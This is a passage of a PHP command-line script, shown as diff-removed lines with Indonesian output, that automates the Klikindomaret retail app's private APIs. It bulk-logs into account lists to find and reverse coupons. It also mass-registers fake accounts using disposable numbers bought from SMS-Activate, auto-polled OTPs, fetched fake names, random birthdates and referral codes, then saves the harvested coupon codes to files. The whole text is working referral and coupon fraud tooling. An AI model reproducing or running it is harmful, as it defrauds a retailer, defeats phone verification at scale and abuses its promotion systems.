-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$LName = $cok[0]->LName;
-				$FBID = $cok[0]->FBID;
-				$satu = get_between($responx, '"LName":"', '"Password"');
-				$dua = get_between($responx, '"IPAddress"', '}');
-				$datpost = '{"ID":"' . $ID . '","FBID":' . $FBID . ',"FName":"' . $jenengd . '","LName":"' . $satu . '"Password":null,"IPAddress"' . $dua . '}';
-				$change = curlx('https://account-api-v2.klikindomaret.com/api/Customer/UpdateProfile?mfp_id=' . $respid . '&isMyAccount=true', $datpost, $kuntul2);
-				if (strpos($change[1], '"IsSuccess":true')) {
-					$pess = json_decode($change[1])->Message;
-					$pess1 = json_decode($change[1])->ResponseObject->FName;
-					$pess2 = json_decode($change[1])->ResponseObject->LName;
-					echo @color('green', "{$pess}\n");
-					echo @color('yellow', "Nama : ");
-					echo @color('nevy', "{$pess1} {$pess2}\n");
-				} else {
-					echo @color('red', "{$change[1]}\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '23':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		echo @color('yellow', "PRIORITAS Kupon   : ");
-		$priox = trim(fgets(STDIN));
-		$prio = strtoupper($priox);
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			echo @color('purple', "\n\n{$verif[1]}\n\n");
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					if ($getscid[1] == []) {
-						echo @color('red', "KERANJANG KOSONG KAK\n");
-					} else {
-						$scid = $za[0]->ID;
-						$toko = $cok[0]->StoreDefault;
-						$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $scid . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-						$json = json_decode($cekk[1]);
-						if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-							echo @color('red', "KUPON KOSONG KAK\n");
-						} else {
-							$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-							echo @color('yellow', "Jumlah Kupon : ");
-							echo @color('green', "{$jumlah}\n");
-							foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-								$kupon = $mydata->CouponMask;
-								$desk = $mydata->CouponMekanisme;
-								//echo "Nama Kupon : $kupon\n";
-								echo @color('yellow', "Nama Kupon   : ");
-								echo @color('green', "{$kupon}\n");
-								echo @color('yellow', "Keterangan   : ");
-								echo @color('blue', "{$desk}\n");
-								if ($kupon == $prio) {
-									echo @color('yellow', "Tersimpan di ada{$prio}.txt\n");
-									save($nomor . "\n", 'ada' . $prio . '.txt');
-								}
-							}
-							echo @color('yellow', "Tersimpan di adavocer.txt\n");
-							save($nomor . "\n", 'adavocer.txt');
-							echo "\n";
-						}
-					}
-				}
-				$no++;
-			} else {
-				echo "{$responx}\n";
-			}
-		}
-		break;
-	case '24':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		masalasasa:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalasasa;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		lagi:
-		echo @color('yellow', "Masukkan Kupon Yg mau di hapus : ");
-		$kupone = trim(fgets(STDIN));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					if ($getscid[1] == []) {
-						echo @color('red', "KERANJANG KOSONG KAK\n");
-					} else {
-						$scid = $za[0]->ID;
-						$toko = $cok[0]->StoreDefault;
-						$cekk = curl('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $scid . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-						$json = json_decode($cekk[1]);
-						if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-							echo @color('red', "KUPON KOSONG KAK\n");
-						} else {
-							$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-							echo @color('yellow', "Jumlah Kupon : ");
-							echo @color('green', "{$jumlah}\n");
-							foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-								$kupon = $mydata->CouponMask;
-								$desk = $mydata->CouponMekanisme;
-								//echo "Nama Kupon : $kupon\n";
-								echo @color('yellow', "Nama Kupon   : ");
-								echo @color('green', "{$kupon}\n");
-								echo @color('yellow', "Keterangan   : ");
-								echo @color('blue', "{$desk}\n");
-							}
-							$hapus = curl('https://api.klikindomaret.com/api/Voucher/ReversalVoucherCoupon?mfp_id=' . $respid, '{"CustomerID":"' . $ID . '","Code":"' . $kupone . '","SalesOrderNo":"","Nominal":"","RegionID":"' . $RegionId . '","ShoppingCartID":"' . $scid . '","ShoppingCartPackageID":null}', $kuntul);
-							$mb = json_decode($hapus[1]);
-							if (strpos($hapus[1], '"status":"SUCCESS"')) {
-								$ket = $mb->ResponseObject->keterangan;
-								echo @color('yellow', "Nama Kupon   : ");
-								echo @color('green', "{$kupon}\n");
-								echo @color('green', "SUKSES HAPUS KAK\n");
-								echo @color('green', "{$ket}\n");
-							} else {
-								echo @color('red', "{$kupone}\n");
-								echo @color('red', "GAGAL HAPUS KAK\n");
-								echo @color('red', "{$ket}\n");
-							}
-						}
-					}
-				}
-				echo "\n";
-				lanjotx:
-				$no++;
-			} else {
-				echo "{$responx}\n";
-			}
-		}
-		echo @color('yellow', "HAPUS KUPON LAGI (y / n )? ");
-		$againx = trim(fgets(STDIN));
-		if (strtolower($againx) == 'y') {
-			goto lagi;
-		}
-		break;
-	case '25':
-		if (file_exists("apikey2AX")) {
-			$apikey = file_get_contents('apikey2AX');
-		} else {
-			echo @color('red', "APIKEY MASIH KOSONG !!!\n");
-			echo @color('nevy', "MASUKKAN APIKEY : ");
-			$apikey = trim(fgets(STDIN));
-			save($apikey, 'apikey2AX');
-		}
-		$password = "123456a";
-		echo @color('yellow', "PASSWORD : {$password}");
-		$sms = new SMSActivate($apikey);
-		$saldo = $sms->getBalance();
-		echo color('green', "\n\n[+]") . " Sisa saldo: {$saldo} ₽\n";
-		orderotpAX:
-		$getnum = $sms->getNumber("ju", 6, 0, "any");
-		if (is_array($getnum)) {
-			$idnum = $getnum["id"];
-			$num = $getnum["number"];
-			$nomor = '0' . substr($num, 2);
-			echo @color('yellow', "NOMOR : {$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$reg = curl('https://api.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=' . $nomor, null, $kuntul);
-			if (strpos($reg[1], '"Message":"Kode OTP berhasil dikirim ke nomor telepon Anda."')) {
-				echo color('blue', "OTP   : ");
-				sleep(5);
-				for ($is = 0; $is < 24; $is++) {
-					$headersx = array();
-					$headersx[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0';
-					$headersx[] = 'Content-Type: application/x-www-form-urlencoded';
-					$ceknmr = curl('https://sms-activate.org/stubs/handler_api.php', 'action=getCurrentActivationsDataTables&api_key=' . $apikey . '&start=0&length=10&order=id&orderBy=asc&typeAction=0&noStat=0', $headersx);
-					$datacek = json_decode($ceknmr[1]);
-					foreach ($datacek->array as $nget) {
-						$idtp = $nget->id;
-						$code = $nget->code;
-						if ($idtp == $idnum) {
-							if (strlen($code) !== 4) {
-								echo ".";
-								sleep(5);
-							} else {
-								$otp = $code;
-								goto ngotepeAX;
-							}
-						}
-					}
-				}
-				$status = $sms->setStatus($idnum, 8);
-				goto orderotpAX;
-				ngotepeAX:
-				echo color('green', "{$otp}\n");
-				$reg2 = curl('https://api.klikindomaret.com/api/PreRegistration/ValidationOTPCodeSMS?NoHP=' . $nomor . '&otpCode=' . $otp, null, $kuntul);
-				if (strpos($reg2[1], '"Message":"Verifikasi berhasil dilakukan."')) {
-					$data = file_get_contents("https://irfan.iproute.my.id/asu.php");
-					$datas = json_decode($data);
-					$nama = $datas->fullname2;
-					$email = $datas->email;
-					$rand = rand(10, 30);
-					$rand2 = rand(1990, 2005);
-					$rand3 = rand(1, 9);
-					$deviceid = urut16();
-					$device_id = str_replace('-', '', $deviceid);
-					$getdev = curl('https://api.klikindomaret.com/api/MobileAppsVersion/getDevice_Token?device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad', null, $kuntul);
-					$hasil = json_decode($getdev[1]);
-					$mfp_id = $hasil->Message;
-					if (file_exists('reff.txt')) {
-						$referral = file_get_contents("reff.txt");
-						$referral = str_replace("\n", "", $referral);
-						$referral = str_replace(" ", "", $referral);
-					} else {
-						$referral = '';
-					}
-					$dates = "{$rand2}-0{$rand3}-{$rand}";
-					$datapost = '{"FName":"' . $nama . '","LName":"","Email":null,"KonfirmasiEmail":"","Gender":"Wanita","Mobile":"' . $nomor . '","KodeReferensi":"' . $referral . '","Password":"' . $password . '","ConfirmPassword":"' . $password . '","IsConfirmed":true,"district":{"id":2483,"name":"Gunung Sahari Selatan"},"isShowPassword":false,"isShowPasswordConfirm":false,"errorMessageEmail":null,"errorMessagePassword":"","errorMessageConfirmPassword":"","isCodeRefMinReq":true,"isRefferalCode":true,"isCodeRefInputNull":false,"messageReferral":"Hore, berhasil menggunakan kode referensi!","ReferrerCode":"' . $referral . '","isReferralActive":true,"ID":"00000000-0000-0000-0000-000000000000","IPAddress":"192.168.56.132","IsSubscribed":0,"IsNewsLetterSubscriber":0,"AllowSMS":false,"LastUpdate":"0001-01-01T00:00:00","DateOfBirth":"' . $dates . 'T00:00:00.000Z","DateOfBirthStringFormatted":"' . $dates . '","TypePushEmail":0,"IsUpload":false,"IsActivated":false,"MobileVerified":true,"DateOfBirthExists":"0001-01-01T00:00:00","OTPValidationExpired":false,"IsFromOtherSystem":false,"OTPCount":0,"OTPAvailable":0,"DeviceID":"' . $device_id . '"}';
-					$post = strlen($datapost);
-					$headers2 = array();
-					$headers2[] = 'Host: prd-api.klikindomaret.com';
-					$headers2[] = 'accept: */*';
-					$headers2[] = 'content-type: application/json';
-					$headers2[] = 'user-agent: okhttp/3.12.1';
-					$headers2[] = 'content-length: ' . $post;
-					$regis = curl('https://prd-api.klikindomaret.com/Account/Customer/Registration?districtID=46826&mfp_id=' . $mfp_id, $datapost, $headers2);
-					$jsregis = json_decode($regis[1]);
-					$Message = $jsregis->message;
-					$type = $jsregis->type;
-					if (strpos($regis[1], '"IsSuccess":true')) {
-						$datapost2 = '{"Email":"' . $nomor . '","Password":"' . $password . '"}';
-						$post2 = strlen($datapost2);
-						$headers3 = array();
-						$headers3[] = 'Host: account-api-v2.klikindomaret.com';
-						$headers3[] = 'accept: */*';
-						$headers3[] = 'content-type: application/json';
-						$headers3[] = 'user-agent: okhttp/3.12.1';
-						$headers3[] = 'content-length: ' . $post2;
-						$login = curl('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad&districtID=51409&TrafficSource=', $datapost2, $headers3);
-						$datalogin = json_decode($login[1]);
-						$Message = $datalogin->Message;
-						$nama = $datalogin->ResponseObject->FName;
-						$date = $datalogin->ResponseObject->DateOfBirth;
-						echo @color('green', "Message : {$Message}\n");
-						echo @color('green', "Nama	: {$nama}\n");
-						echo @color('green', "Date	: {$date}\n");
-						if ($Message == "Nomor ponsel atau kata sandi Anda tidak valid") {
-							echo @color('red', "\n\n{$login[1]}\n\n");
-							goto endingAX;
-							die;
-						}
-						save("{$nomor};{$password};{$device_id}\n", 'akunklik.txt');
-						
-						$respi = json_decode($login[1]);
-						$respid = $respi->ResponseID;
-						$idne = $respi->ResponseObject->ID;
-						$toked = $respi->ResponseObject->Token;
-						#################################################
-						$kuntul2 = array();
-						$kuntul2[] = 'Content-Type: application/json';
-						$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-						$kuntul2[] = 'Applicationkey: indomaret';
-						$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-						$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-						$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-						$respon = $cekvcne[1];
-						if (strpos($respon, '"IsActivated":true')) {
-							$cok = json_decode($respon);
-							$ID = $cok[0]->ID;
-							$RegionId = $cok[0]->RegionId;
-							$storeid = $cok[0]->StoreDefault;
-							$notip = curl('https://api.klikindomaret.com/api/Customer/GetInboxByUser?id=' . $ID . '&mfp_id=' . $respid . '&pages=1&NotifType=&ChildNotifType=&RangeDays=', null, $kuntul);
-							// echo @color('green', "\n\n$notip[1]\n\n");
-							$pesan = json_decode($notip[1]);
-							foreach ($pesan[0]->InboxData as $inbox) {
-								#
-								$Description = $inbox->Description;
-								$pecah = explode(".", $Description);
-								$desc1 = $pecah[0];
-								$CouponCode = $inbox->DetailInfo->CouponCode;
-								$CouponPeriode = $inbox->DetailInfo->CouponPeriode;
-								echo @color('green', "Pesan   : ");
-								echo @color('nevy', $desc1 . "\n");
-								echo @color('green', "Kode	: ");
-								echo @color('nevy', $CouponCode . "\n");
-								echo @color('green', "Berlaku : ");
-								echo @color('nevy', $CouponPeriode . "\n");
-								save("{$nomor};{$password};{$CouponCode};{$device_id}\n", 'akunberkupon.txt');
-								echo @color('yellow', "Tersimpan di akunberkupon.txt\n");
-								goto endingAX;
-							}
-						} else {
-							echo @color('red', $respon . "\n");
-						}
-						goto endingAX;
-					} else {
-						echo @color('red', "GAGAL REGIS\n");
-						echo @color('red', "{$regis[1]}\n");
-					}
-				}
-			} elseif (strpos($reg[1], '"Nomor sudah digunakan oleh akun lain."')) {
-				echo @color('red', "Nomor sudah digunakan oleh akun lain.\n");
-				goto orderotpAX;
-			} else {
-				echo @color('red', "{$reg[1]}\n");
-			}
-			endingAX:
-			$status = $sms->setStatus($idnum, 6);
-			$saldo = $sms->getBalance();
-			echo color('green', "[+]") . " Sisa saldo: {$saldo} ₽\n";
-			if ($saldo > 4) {
-				goto orderotpAX;
-			}
-			echo @color('yellow', "BUAT LAGI (y / n )? ");
-			$againx = trim(fgets(STDIN));
-			if (strtolower($againx) == 'y') {
-				goto orderotpAX;
-			}
-		}
-		break;
-	case '26':
-		$password = "123456a";
-		echo @color('green', "REFF  : ");
-		$referral = trim(fgets(STDIN));
-		regisan:
-		echo @color('green', "NOMOR : ");
-		$nomorr = trim(fgets(STDIN));
-		$nomor = str_replace("628", "08", $nomorr);
-		$nomor = str_replace('+', "", $nomor);
-		$deviceid = urut16();
-		$device_id = str_replace('-', '', $deviceid);
-		$headers = array();
-		$headers[] = 'Host: api.klikindomaret.com';
-		$headers[] = 'accept: */*';
-		$headers[] = 'content-type: application/json';
-		$headers[] = 'user-agent: okhttp/3.12.1';
-		################################################
-		$cekno = curl('https://api.klikindomaret.com/api/Customer/GetByMobilePhone?mobilePhone=' . $nomor, null, $headers);
-		sleep(1);
-		################################################
-		$sendotp = curl('https://api.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=' . $nomor, null, $headers);
-		sleep(1);
-		$hasil = json_decode($sendotp[1]);
-		$message = $hasil[0]->Message;
-		if ($message != "Kode OTP berhasil dikirim ke nomor telepon Anda.") {
-			echo @color('red', "{$sendotp[1]}\n");
-			goto regisan;
-			die;
-		}
-		#################################################
-		echo @color('green', "OTP   : ");
-		$otp = trim(fgets(STDIN));
-		$validotp = curl('https://api.klikindomaret.com/api/PreRegistration/ValidationOTPCodeSMS?NoHP=' . $nomor . '&otpCode=' . $otp, null, $headers);
-		$hasil = json_decode($validotp[1]);
-		$message = $hasil[0]->Message;
-		echo @color('yellow', "{$message}\n");
-		sleep(1);
-		#################################################
-		$getdev = curl('https://api.klikindomaret.com/api/MobileAppsVersion/getDevice_Token?device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad', null, $headers);
-		$hasil = json_decode($getdev[1]);
-		$mfp_id = $hasil->Message;
-		#################################################
-		sleep(1);
-		$data = file_get_contents("https://irfan.iproute.my.id/asu.php");
-		$datas = json_decode($data);
-		$nama = $datas->fullname2;
-		$email = $datas->email;
-		$rand = rand(10, 30);
-		$rand2 = rand(1990, 2005);
-		$rand3 = rand(1, 9);
-		$nom = 1;
-		ulang:
-		$dates = "{$rand2}-0{$rand3}-{$rand}";
-		$datapost = '{"FName":"' . $nama . '","LName":"","Email":null,"KonfirmasiEmail":"","Gender":"Wanita","Mobile":"' . $nomor . '","KodeReferensi":"' . $referral . '","Password":"' . $password . '","ConfirmPassword":"' . $password . '","IsConfirmed":true,"district":{"id":2483,"name":"Gunung Sahari Selatan"},"isShowPassword":false,"isShowPasswordConfirm":false,"errorMessageEmail":null,"errorMessagePassword":"","errorMessageConfirmPassword":"","isCodeRefMinReq":true,"isRefferalCode":true,"isCodeRefInputNull":false,"messageReferral":"Hore, berhasil menggunakan kode referensi!","ReferrerCode":"' . $referral . '","isReferralActive":true,"ID":"00000000-0000-0000-0000-000000000000","IPAddress":"192.168.56.132","IsSubscribed":0,"IsNewsLetterSubscriber":0,"AllowSMS":false,"LastUpdate":"0001-01-01T00:00:00","DateOfBirth":"' . $dates . 'T00:00:00.000Z","DateOfBirthStringFormatted":"' . $dates . '","TypePushEmail":0,"IsUpload":false,"IsActivated":false,"MobileVerified":true,"DateOfBirthExists":"0001-01-01T00:00:00","OTPValidationExpired":false,"IsFromOtherSystem":false,"OTPCount":0,"OTPAvailable":0,"DeviceID":"' . $device_id . '"}';
-		$post = strlen($datapost);
-		$headers2 = array();
-		$headers2[] = 'Host: prd-api.klikindomaret.com';
-		$headers2[] = 'accept: */*';
-		$headers2[] = 'content-type: application/json';
-		$headers2[] = 'user-agent: okhttp/3.12.1';
-		$headers2[] = 'content-length: ' . $post;
-		$regisan = curl('https://prd-api.klikindomaret.com/Account/Customer/Registration?districtID=46826&mfp_id=' . $mfp_id, $datapost, $headers2);
-		//  echo @color('purple', "$regisan[1]\n");
-		$jsregis = json_decode($regisan[1]);
-		$Message = $jsregis->message;
-		$type = $jsregis->type;
-		if ($type == 'https://tools.ietf.org/html/rfc7231#section-6.5.1') {
-			echo @color('red', "TUNGGU SEBENTAR\n");
-			$no++;
-			sleep(1);
-			goto ulang;
-		} else {
-			if ($regisan[1] == 'API calls quota exceeded! maximum admitted 1 per 1s.') {
-				echo @color('red', "API calls quota exceeded! maximum admitted 1 per 1s.\n");
-				sleep(2);
-				goto ulang;
-			}
-		}
-		sleep(1);
-		if ($Message != "OK") {
-			echo @color('red', "\n{$regisan[1]}\n");
-			echo @color('red', "GAGAL CREATE\n");
-			goto regisan;
-			die;
-		}
-		#################################################
-		$datapost2 = '{"Email":"' . $nomor . '","Password":"' . $password . '"}';
-		$post2 = strlen($datapost2);
-		$headers3 = array();
-		$headers3[] = 'Host: account-api-v2.klikindomaret.com';
-		$headers3[] = 'accept: */*';
-		$headers3[] = 'content-type: application/json';
-		$headers3[] = 'user-agent: okhttp/3.12.1';
-		$headers3[] = 'content-length: ' . $post2;
-		$login = curl('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad&districtID=51409&TrafficSource=', $datapost2, $headers3);
-		$datalogin = json_decode($login[1]);
-		$Message = $datalogin->Message;
-		$nama = $datalogin->ResponseObject->FName;
-		$date = $datalogin->ResponseObject->DateOfBirth;
-		echo @color('green', "Message : {$Message}\n");
-		echo @color('green', "Nama	: {$nama}\n");
-		echo @color('green', "Date	: {$date}\n");
-		if ($Message == "Nomor ponsel atau kata sandi Anda tidak valid") {
-			echo @color('red', "\n\n{$login[1]}\n\n");
-			goto regisan;
-			die;
-		}
-		save("{$nomor};{$password};{$device_id}\n", 'akunklik.txt');
-		
-		$respi = json_decode($login[1]);
-		$respid = $respi->ResponseID;
-		$idne = $respi->ResponseObject->ID;
-		$toked = $respi->ResponseObject->Token;
-		#################################################
-		$kuntul2 = array();
-		$kuntul2[] = 'Content-Type: application/json';
-		$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-		$kuntul2[] = 'Applicationkey: indomaret';
-		$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-		$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-		$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-		$respon = $cekvcne[1];
-		if (strpos($respon, '"IsActivated":true')) {
-			$cok = json_decode($respon);
-			$ID = $cok[0]->ID;
-			$RegionId = $cok[0]->RegionId;
-			$storeid = $cok[0]->StoreDefault;
-			$notip = curl('https://api.klikindomaret.com/api/Customer/GetInboxByUser?id=' . $ID . '&mfp_id=' . $respid . '&pages=1&NotifType=&ChildNotifType=&RangeDays=', null, $headers);
-			$pesan = json_decode($notip[1]);
-			foreach ($pesan[0]->InboxData as $inbox) {
-				#
-				$Description = $inbox->Description;
-				$pecah = explode(".", $Description);
-				$desc1 = $pecah[0];
-				$CouponCode = $inbox->DetailInfo->CouponCode;
-				$CouponPeriode = $inbox->DetailInfo->CouponPeriode;
-				echo @color('green', "Pesan   : ");
-				echo @color('nevy', $desc1 . "\n");
-				echo @color('green', "Kode	: ");
-				echo @color('nevy', $CouponCode . "\n");
-				echo @color('green', "Berlaku : ");
-				echo @color('nevy', $CouponPeriode . "\n");
-				save("{$nomor};{$password};{$CouponCode};{$device_id}\n", 'akunberkupon.txt');
-				echo @color('yellow', "Tersimpan di akunberkupon.txt\n");
-				goto regis;
-			}
-		} else {
-			echo @color('red', $respon . "\n");
-		}
-		goto regisan;
-		break;
-	case '27':
-		masalxccxx22:
-		echo "Masukkan kode toko: ";
-		$kodetoko = trim(fgets(STDIN));
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		echo @color('yellow', "DAFTAR HIDANGAN :\n");
-		echo @color('red', "[1] Antar\n");
-		echo @color('yellow', "[2] Ambil\n");
-		echo @color('yellow', "pilih : ");
-		$ambil = trim(fgets(STDIN));
-		if ($ambil == '1') {
-			goto khususantar22;
-		}
-		echo @color('yellow', "TANGGAL Ambil : ");
-		$tgle = trim(fgets(STDIN));
-		echo @color('yellow', "BULAN Ambil : ");
-		$blne = trim(fgets(STDIN));
-		echo @color('yellow', "JAM AMBIL :\n");
-		echo @color('yellow', "[1] 07:00-07:59\n");
-		echo @color('yellow', "[2] 08:00-08:59\n");
-		echo @color('yellow', "[3] 09:00-09:59\n");
-		echo @color('yellow', "[4] 10:00-10:59\n");
-		echo @color('yellow', "[5] 11:00-11:59\n");
-		echo @color('yellow', "[6] 12:00-12:59\n");
-		echo @color('yellow', "[7] 13:00-13:59\n");
-		echo @color('yellow', "[8] 14:00-14:59\n");
-		echo @color('yellow', "[9] 15:00-15:59\n");
